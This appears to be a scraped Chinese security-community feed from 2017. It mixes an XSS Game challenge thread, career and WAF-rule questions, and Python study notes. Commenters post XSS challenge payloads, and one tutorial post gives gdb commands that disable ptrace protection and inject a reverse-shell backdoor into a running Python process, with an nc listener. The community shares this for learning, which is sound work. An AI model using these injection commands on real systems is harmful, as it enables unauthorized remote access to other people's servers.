<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 这种方式很赞很赞

<img src="https://file.xiaomiquan.com/2b/f9/2bf9e6206c897d781f31230a6f9923b346da1a247d2a1822470bf25995a3659f.jpg" width="25px"/> __winlans__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我感觉设计模式之蝉更好点或许

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 弦哥，有研究s2-048吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 意义不大


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:


__#挑战#__

  既然刚刚有同学说想来些“挑战”，嗯，前段时间想练手 Google 的 CTF，后来发现这个 XSS Game，然后花了一个下午独立通关了 Google 的这个 XSS 挑战（这个应该是比较新的挑战了）。总共 8 关，不那么简单，如果谁独立通关前 3 关（前 3 关其实很简单），那么请评论留言，下周我会公布前 3 关的细节思路，我的思路绝对有亮点，如果你真的玩进去了...

对了，其实攻略有人写过（虽然比较粗糙），如果你偷懒去看，而不是自己独立完成的，那还是别来评论了吧。

挑战地址：

[https://www.xssgame.com](https://www.xssgame.com)



要翻墙。

如果没什么人玩，以后还是别期待我分享前端黑漏洞挖掘相关的东西了...😏

<img src="https://images.xiaomiquan.com/Fluq5ysg9P99-xMgpWwvLuKaYcDy?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BZN9PM5f5iCcLRG0_qjPK8j1gpY=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 好家伙，马上玩起，以前玩过这个：
[http://xss-quiz.int21h.jp/](http://xss-quiz.int21h.jp/)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 这个我下次再来写攻略，很经典，18关。大家可以先玩 Google 这个。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 第一题，原封不动<script>alert()</script>
第二题就是双引号和单引号括号urlencode输入
第三题 \"  可以变成  "

<img src="https://file.xiaomiquan.com/c8/4d/c84d3b3fb2f71423e6a315e509f1918fe8d921e54c95e219cdb75c4083ed3acb.jpg" width="25px"/> __Loong__: ',alert(),'

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 被自己蠢哭了，第三题就因为没在抓包工具里url解码，抓狂了好久。。。

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 0');alert('

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 'onerror='alert()'

<img src="https://file.xiaomiquan.com/02/c2/02c29c774c01e67904e2a54d7c47a07b32e73898a3e9863a47a26b93099e474e.jpg" width="25px"/> __桔多淇__: 想玩又不会的还不让看攻略😱

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/02/c2/02c29c774c01e67904e2a54d7c47a07b32e73898a3e9863a47a26b93099e474e.jpg" width="25px"/> __桔多淇__: 我原来为没玩过，就只是懂一点js和一些简单的xss技巧。。。
然后自己摸索了快两个小时才过三关

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 什么意思，我在这被坑了好久，浏览器标签里的字符串都用的双引号，结果choosetab用的单引号😡

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 我也被自己蠢哭了，我把它当做document.write一样去试各种编码了😂

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/c8/4d/c84d3b3fb2f71423e6a315e509f1918fe8d921e54c95e219cdb75c4083ed3acb.jpg" width="25px"/> __Loong__: 这个方法聪明


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:

> 熟人不宜 提问：
弦哥好，我是一名web测试工程师。进圈子有段时间了，默默的关注着众大虾们分享着，学习着各种安全技能。我有个请求，余弦大大既然是web特别是前端方面的安全大咖（您的书我拜读过），能否出个web安全方面的小系列呢？那种大家可以直接应用在自己工作中的小技巧或者小思路。我举个粗陋的例子：比如两个input框有XSS问题，但是有字数限制，我们或许可以通过注释来合并两条语录。类似这样的……您觉得呢？


嗯...好建议...不过我也发愁呀，众口难调，你懂得，你看有人要黑手系列，有人要 Web 前端黑系列，有人要渗透系列，有人要挖洞系列，有人要防御系列，有人要工具系列，有人要成长系列，有人要威胁情报系列....

所以，我们的分享还是按我们自己的节奏来，你说的这些我会有计划，但不一定那么快。最近我们组建了个分享团队（ATToT 安全小组，本圈的嘉宾都是这个小组的），大家都会有自己的分享路线，多少可以满足些不同的“口味”需求。

分享不容易，我们努力保证“可持续性发展”。🤣力求本圈出品，必属精品！



...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 黑手是什么呀

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 黑客手机...

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__: 你发什么我们就看什么呗

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 嗯嗯，多谢回答。我觉得今晚分享的这个XSSGAME就不错啊，期待后续您的小思路～

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 期望多分享点，安服工程师工作时用到的东西，怎么样又快又准确的完成渗透测试，期待老大如果有时间发一些系列的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-04:

> 匿名用户 提问：
余弦哥，今天抢到了一加5，萌新准备尝试刷黑手，求问圈里是否会发布相关教程，谢谢!


好问题，多少人感兴趣黑手，点赞留言看看，没关注我们优先级就不高啦。



...

<img src="https://file.xiaomiquan.com/c4/95/c49553be9376580d12182ad362ab1fa40a79f81573fe4d5b5c0516f38208bb7c.jpg" width="25px"/> __cj__: 正在用一加3t😆

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c4/95/c49553be9376580d12182ad362ab1fa40a79f81573fe4d5b5c0516f38208bb7c.jpg" width="25px"/> __cj__: 3t第一时间入手就刷了，不好用，不如一加一

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 一加一也可以？那在淘宝上买个二手的可否？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 当然可以，质量还不错，如果rp还行的话

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 感觉自己RP不够，弦哥觉得一加5会好用吗？

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 之前淘宝买了nexus5，有刷成功，试过劫持，就很少用了

<img src="https://file.xiaomiquan.com/79/28/79283102cc43e26f36b78e0a346002dd559a8db2ce9728c413bd0e79ebb6ccf3.jpg" width="25px"/> __深度__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 因为没怎么接触过..想问问黑手有什么优势. 或者说独特的地方吗？另外问问锤子手机能刷不😅

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 前几天用加三刷了黑手，不过不太会用，可以交流一下啊

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 不知道我的Z5P能不能刷。。。

<img src="https://file.xiaomiquan.com/e9/f2/e9f2245d601bfd0319b7a093704e9190d027166605b608aadba0f8c034dd8353.jpg" width="25px"/> __Eeyore__: 同样入手一加五，从iOS转Android，觉得现在的一些Android OS确实做得越来越好了，支持黑手！

<img src="https://file.xiaomiquan.com/25/54/2554db8a586cc8faa9975308b54f5988af68e0b341cb88b77e90e4c05ebeab88.jpg" width="25px"/> __Immortals__: 准备换手机，也想还一加5，玩玩黑手的感觉，玩过一加5黑手有感受的，麻烦多给我们新手说说经验

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 看官方有支持列表

<img src="https://file.xiaomiquan.com/d9/8d/d98d18950409c1a21557e81ea5b11addd5d8e0929702f32011454f6efb1c5892.jpg" width="25px"/> __GEASS__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我看官方支持的机型不多。大佬能不能讲解一下如何编译适配其他机型啊。

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 玩黑手到底是啥感觉腻？？？

<img src="https://file.xiaomiquan.com/fc/c5/fcc525e8f31cc9e4d209e89fd44522ce7714c948f57e06dbd600b311ebd4d145.jpg" width="25px"/> __猫不会笑__: 如果是走二手，买一加1的话，16g是否足够呢?


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-04:

> dolf 提问：
弦哥，您好！最近在帮助完善公司自研waf的规则库，针对struts 2漏洞的防御，是不是需要先大体搞懂struts2框架，然后挨个了解每个漏洞的原理，最后提取攻击特征，这么一个漫长的过程，有没有更加有效的方法呢？


能这样当然最好了，越了解攻越知道该如何防御。很多人以为加防火墙规则很容易很枯燥，其实如果真的做细了，你会发现里面的知识点太多了，能沉淀几年，那收益会非常的大。可惜很多人都是半吊子，很容易浮躁，总想找捷径。

其实加规则有时候不一定都需要非常懂漏洞，黑盒灰盒观察流量的特征也行。但是知道为什么很多防御被绕过吗？因为加规则的人不是真的搞懂了漏洞原理，所以加的规则不完备...

更加有效的方式就是：刨根问底重复重复再重复，究其本质，把每个规则都当做一个完美的艺术品去加！坚持几年再说！



...

<img src="https://file.xiaomiquan.com/94/09/94091e1d81feca327f8cfb1a97ba6f917599e83731a52018be918372a919f16e.jpg" width="25px"/> __dolf__: 嗯嗯，谢谢弦哥的解答


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-04:


__#姿势#__

 如何给正在运行的 Python 进程注入后门连接

今天分享个昨晚玩的姿势，首先这个姿势来源这个开源项目 pyrasite：

[GitHub - lmacken/pyrasite: Inject code into runnin...](https://github.com/lmacken/pyrasite)



这个项目介绍是：Inject code into running Python processes，之前@Moriarty 推荐过这个好工具。

但是我这不是要介绍这个工具的用法，用法直接看其官网的视频（pyrasite.com），一目了然。

我昨晚读了一遍 pyrasite 源码，很快就明白了本质的原理，这里给大家分享下（以 Linux 环境下的情况为例，需要 root 权限）。其实关键语句就这句：

gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("print(\"hiworld\")")' -eval-command='call PyGILState_Release($1)'

对，gdb，这是经典的调试神器了，玩过 gdb 的都知道，这个神器支持直接对目标进程运行态进行动态调试，不过这有个前提，需要开启：

echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

开启后，如上那条 gdb 语句，-p 参数背后跟目标 Python 进程的 pid，我这里测试的是 3142，然后 -eval-command 是注入需要执行的命令，仔细看有几个 -eval-command，这些命令会顺序执行，最终执行的是 PyRun_SimpleString 函数里的 Python 代码：

print("hiworld")

好，现在可以注入 Python 代码，打印 hiworld 了，那么我们注入个反弹到我们的远程 nc 吧。

gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("exec(open(\"back.py\").read())")' -eval-command='call PyGILState_Release($1)'

其中，back.py 就是一个反弹脚本，反弹连接到我们的 nc 监听上：

nc -l -p 1134 -vv

效果如图所示，相关测试脚本见附件，简单说明下：

t.py 是目标进程，back.py 是反弹脚本，都在 test.zip 里。

[后记]

1. 进程注入，gdb 的这种用法大家可以开脑洞，那么其他类型的进程我们是否也可以这样优雅地注入？
2. 我们在用一些优秀的工具时，不应该只停留在只会用，如果有源码，我们可以读通其源码，看看作者的思路，是个非常好的学习机会。而且这样下来，你其实比只会用用而已的人更能驾驭这款工具的高阶姿势。
3. 工欲善其事必先利其器，这也是为什么本圈会介绍些优秀工具的用法或剖析。

<img src="https://images.xiaomiquan.com/FhjYwyDP9bQ70k62Z865kgNT5sEy?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qJwkqNZR070Utu72QpvX61CM3YM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fre61g-QQP25C6LpeNViNu8rco9i?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dI__gGgAbp-dh0laadkojccPZYI=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fsq67FFptePGDtB_Qxe5cNwiAYgj?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jYtsyELcJrPuCMd2wEuWbg14Ak8=" width="50%" height="50%" align="middle"/>

__分享文件:__
[test.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 不是做安全的，但搞过php进程的注入，思路类似，写一段py脚本（gdb提供py接口的包装），使用gdb执行～

eval "gdb --batch -nx ${PHP_BIN} ${PHP_PID} -ex \"source ${PY_SCRIPT_FILE}\" 2>/dev/null"

另外有有一些库可以动态注入机器码或者so文件，比如linux-inject，安卓上有人用这种技术做坏事，原理本质上一样，都是用了ptrace系统调用，有的软件做了反调试的话，需要想方法绕过～

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 😄赞

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 现在生产环境中有多少服务器中安装了gdb呢？占的比例大概有多少？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 不好说

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 安装也很容易

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 厉害👍谢谢分享，同时弱弱的问一句，要是已经有linux root权限了还用gdb去注入反弹么😂


...

---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-03:


__#Python安全开发打怪升级之路#__


前言:前几天看到@Aodongq1n的一个提问，主要表达意思是东西内容过多，节奏感跟不上。后来我就想是否知识过于零碎，然后会不会让人产生方向感模糊，从而望而却步呢。首先这个问题可能会存在的，也是正常的，因为学习觉得可以分为两种分支进行，一根是自己的主线进行系统化学习，还有一根是扩宽自己的知识面查漏补缺(在这个过程发现到自己感兴趣的就可以尝试，不感兴趣的作为普及)；零碎有零碎的好处可以快速掌握知识，快速解决问题，对于有基础的是很好的查漏补缺的方法，但是如果面对不太了解的，可能会出现方向感不稳；系统其实不是心里面想的那种多么系统多么系统，系统化是个路线，具体这个路线哪边重哪边轻这个需要自己把握，这样的缺点时间比较长，但是一步步跟下来不容易失去方向感。我自己是做安全方面的开发，所以根据工作的场景，我暂时分享的关联性路线是
Python普通语法、Pythonic、Python安全开发常用模块、Poc等安全工具编写、Python爬虫。
这4块主要分享个人Python打怪过程中的笔记，所以可能会存在一定口语化、格式化简陋或者理解的错误，希望大家帮忙指正。谢谢！
PS:更多的是总结，所以可能有的地方不会很细，建议配合廖雪峰的教程，参考这份然后记录成自己的内容。


__分享文件:__
[Python基础笔记1-10章.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 有基础莫非还有升级版本

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 附一个导航页，节约时间
[安全导航](http://coco413.com/SecNavi/)



<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 很关键，刚想学用py写爬虫

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 不错的导航

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个笔记赞

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 你这个笔记很不错的，可以让新人少走很多弯路，赞！

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 期待着后续( ੭ ˙ᗜ˙ )੭

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 期待更多分享

<img src="https://file.xiaomiquan.com/91/ab/91abedc3209d808960d74414a5a7631edd9359b5e79703f4d605c02d30cc10a1.jpg" width="25px"/> __任长龙__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 赞导航

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 干货满满

<img src="https://file.xiaomiquan.com/82/33/823309d5596e0b2608263c890c58e8740001f7a826e31f1fdaa29f068c2ca063.jpg" width="25px"/> __Aodongq1n__: 走心，3Q

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 貌似Chrome下 导航显示404

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 感谢

<img src="https://file.xiaomiquan.com/ac/87/ac878c8ccb825ad38e3921265e1743df70d5fe1d3ff705f507024d6669785967.jpg" width="25px"/> __西子酱__: Cool

<img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__: 很赞


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-03:


__#姿势#__

 
__#python#__

 

刚好之前ke分享了netcat的使用，这次为大家分享一下如何使用python编写一个简单的python版的netcat。


[python编写简单netcat | D_infinite的小站](http://dinfinite.cn/2017/07/03/python%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95netcat/)



还是一样，有任何问题和建议欢迎评论区留言，咱们共同分享，共同进步。



...

<img src="https://file.xiaomiquan.com/11/91/1191aa3c74051c94f3264a52669a61f7404372ae20061499297c4f7a42451a1d.jpg" width="25px"/> __live2know__: 学习

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 👍，我是工具工程师，这个直接自己编写😁

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 写完整后可以开源了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-03:

> 吕土金 提问：
弦好，请安。请教一事不懂，看到某支付企业招人，岗位是安全系统开发，负责安全监控和安全风险评估。什么是安全系统开发？风险评估怎么做？没有接触过支付圈子，请您明示。也请各位懂行的给讲讲，谢谢！


好吧，这个我不算了解，有了解的同学可以互动下。我的理解是因为支付是非常需要做风险控制的，因为和钱有关，那么一定需要一套完整成熟系统或体系来监控异常，评估风险级别，然后指导采取行动，比如阻止、警报等。这些至少包括：合法用户的账号安全、资金安全，还包括“撸羊毛”风险，比如会有大量“非法”的注册用户，来自大量黑号注册的，对这个支付平台相关业务进行大规模刷单。

由于我没从事这个行业，但多少了解些，算是皮毛吧，更多的留给这个行业的人来互动。



...

<img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__: 支付🐶路过，感觉岗位从文字看应该是找安全平台建设与监控响应，以及对一些安全事件的处置评估，因为支付机构受人行监管，有很多合规要求。当然也可能会涉及风控，不过支付机构有专门的风控部门，是偏业务的

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__: 嗯 很多合规要求。

<img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 业务又要打插边球，又要快，常导致不安全，所以要评估有啥办法可以既合规又不影响人行技术检查还能保证一定的安全。啊呸，哪有这么好的是记得告诉我😂😂😂

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__ replies to <img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__: 监控平台的响应包括什么？例如大量黑账号注册，或者支付频率不正常，或者支付地点可疑等等？请讲讲你在单位都做啥，好吗？给我们普及一下，谢了😍

